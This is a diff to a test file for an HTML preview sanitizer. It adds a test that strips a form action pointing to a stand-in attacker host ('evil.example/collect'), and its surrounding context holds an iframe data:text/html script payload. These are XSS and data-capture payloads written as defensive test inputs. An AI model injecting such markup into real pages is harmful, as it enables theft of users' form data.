@@ -119,6 +119,13 @@ describe('sanitizePreviewHtml — XSS payload stripping', () => {
     assertSafe(out)
   })
 
+  it('strips external form action attributes from previews', () => {
+    const out = sanitizePreviewHtml('<form action="https://evil.example/collect" method="post"><input></form>')
+    expect(out).toContain('<form')
+    expect(out).not.toContain('action=')
+    assertSafe(out)
+  })
+
   it('strips data:text/html in src', () => {
     const out = sanitizePreviewHtml('<iframe src="data:text/html,<script>alert(1)</script>">')
     assertSafe(out)
